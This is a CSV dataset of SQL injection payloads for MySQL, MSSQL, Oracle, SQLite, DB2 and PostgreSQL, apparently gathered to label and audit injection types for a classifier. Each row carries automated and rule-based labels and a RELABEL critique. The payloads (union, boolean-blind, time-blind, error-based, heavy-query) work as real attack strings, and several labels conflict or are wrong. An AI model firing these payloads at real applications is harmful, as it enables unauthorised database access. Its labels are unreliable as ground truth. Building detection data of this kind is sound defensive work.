payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"-9176' ) ) as eunw where 5978 = 5978 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,mysql,0.5,group_concat,RELABEL,reasoning too short (12 chars); confidence too low (0.50),boolean_blind,mysql,24163,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"-9176' ) ) as eunw where 5978 = 5978 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #"
"-3074' ) ) union all select 6131,6131,6131,6131,6131,6131,6131--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24164,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3074' ) ) union all select 6131,6131,6131,6131,6131,6131,6131--"
1' and sleep ( 5 ) and 'kapr' = 'kapr,time_blind,mysql,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,24165,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1' and sleep ( 5 ) and 'kapr' = 'kapr
"1%' ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( '%' = '",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,24166,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1%' ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( '%' = '"
"1 ) where 6720 = 6720 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",error_based,mysql,0.9,exp_extract,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,24167,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 ) where 6720 = 6720 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --"
"-9698 ) as pvhn where 3223 = 3223 or elt ( 6563 = 9210,9210 ) --",boolean_blind,mysql,0.7,elt_boolean,RELABEL,reasoning too short (11 chars),boolean_blind,mysql,24168,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"-9698 ) as pvhn where 3223 = 3223 or elt ( 6563 = 9210,9210 ) --"
"1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ""mynm"" like ""mynm",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,24169,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ""mynm"" like ""mynm"
-1989%' ) ) or 6179 = 8518#,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,24170,boolean_blind,generic,Pattern match: 'or 6179 = 8518' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-1989%' ) ) or 6179 = 8518#
1'|| ( select 'vwls' where 5252 = 5252 rlike sleep ( 5 ) #,time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars),time_blind,mysql,24171,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1'|| ( select 'vwls' where 5252 = 5252 rlike sleep ( 5 ) #
-8357' ) ) as henk where 8198 = 8198 or 2558 = 9103#,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,24172,boolean_blind,generic,Pattern match: 'or 2558 = 9103' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-8357' ) ) as henk where 8198 = 8198 or 2558 = 9103#
1' ) as yxdb where 4597 = 4597,union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,24173,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) as yxdb where 4597 = 4597
-1393' ) ) ) union all select 8280--,union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24174,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-1393' ) ) ) union all select 8280--
"1 where 9869 = 9869 union all select null,null#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24175,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 where 9869 = 9869 union all select null,null#"
select ( case when ( 8294 = 4332 ) then 1 else 8294* ( select 8294 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.7,iif_boolean,RELABEL,reasoning too short (11 chars),boolean_blind,mssql,24176,boolean_blind,mssql,generic SQL keywords without specific signal,boolean_blind,mssql,generic SQL structure without strong signal,select ( case when ( 8294 = 4332 ) then 1 else 8294* ( select 8294 from master..sysdatabases ) end ) --
"1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,24177,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )"
"1' ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,24178,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #"
"-3775' ) as rqet where 7092 = 7092 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.7,elt_boolean,RELABEL,reasoning too short (11 chars),boolean_blind,mysql,24179,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"-3775' ) as rqet where 7092 = 7092 or elt ( 1032 = 1032,3623 ) --"
"1' ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( 'dtym' = 'dtym",error_based,mysql,0.9,updatexml,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,24180,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( 'dtym' = 'dtym"
"1"" ) where 5196 = 5196 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",out_of_band,oracle,0.9,ctxsys_drithsx,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,24181,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"1"" ) where 5196 = 5196 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"
"1 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) -- ofqd",error_based,mssql,0.9,mssql_cast,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,24182,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) -- ofqd"
"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( ""sxih"" = ""sxih",time_blind,mysql,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,24183,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( ""sxih"" = ""sxih"
-4325 order by 1--,union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24184,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,-4325 order by 1--
"-2321%"" ) or 2271 = 7683--",boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,24185,boolean_blind,generic,Pattern match: 'or 2271 = 7683' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-2321%"" ) or 2271 = 7683--"
"1"" ) as ranl where 5553 = 5553",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,24186,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) as ranl where 5553 = 5553"
"1' ) where 8628 = 8628 union all select null,null,null--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24187,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) where 8628 = 8628 union all select null,null,null--"
"-3007 ) where 6648 = 6648 union all select 6648,6648,6648,6648,6648,6648,6648,6648#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24188,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3007 ) where 6648 = 6648 union all select 6648,6648,6648,6648,6648,6648,6648,6648#"
1'|| ( select 'awba' from dual where 3749 = 3749 and 1445 = 3334--,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,24189,boolean_blind,oracle,Pattern match: 'and 1445 = 3334' → boolean_blind (P3); DB signature: oracle,boolean_blind,oracle,"boolean condition (1=1, RLIKE, or ELT)",1'|| ( select 'awba' from dual where 3749 = 3749 and 1445 = 3334--
"-6186' in boolean mode ) union all select 2990,2990,2990#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,24190,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6186' in boolean mode ) union all select 2990,2990,2990#"
"1' ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users )",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,24191,boolean_blind,mysql,generic SQL keywords without specific signal,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users )"
"1"" or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",error_based,mysql,0.9,exp_extract,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,24192,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )"
"1' ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'xdce' = 'xdce",time_blind,sqlite,0.7,like_randomblob,RELABEL,reasoning too short (15 chars),time_blind,sqlite,24193,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1' ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'xdce' = 'xdce"
"1 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.7,db2_sysjoin,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,24194,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"1 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --"
"1"" where 4073 = 4073 rlike ( select ( case when ( 8716 = 4281 ) then 1 else 0x28 end ) ) --",time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,24195,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1"" where 4073 = 4073 rlike ( select ( case when ( 8716 = 4281 ) then 1 else 0x28 end ) ) --"
"1"" ) ) ) union all select null,null,null,null,null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,24196,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) ) ) union all select null,null,null,null,null,null,null--"
"waitfor delay '0:0:5' and ( ( ""%"" = """,time_blind,mssql,0.9,waitfor,RELABEL,reasoning too short (7 chars),time_blind,mssql,24197,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,"waitfor delay '0:0:5' and ( ( ""%"" = """
"1"" ) where 2312 = 2312 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,24198,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) where 2312 = 2312 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --"
"-9434"" ) as cqlw where 1600 = 1600 or 2733 = 1047--",boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,24199,boolean_blind,generic,Pattern match: 'or 2733 = 1047' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-9434"" ) as cqlw where 1600 = 1600 or 2733 = 1047--"
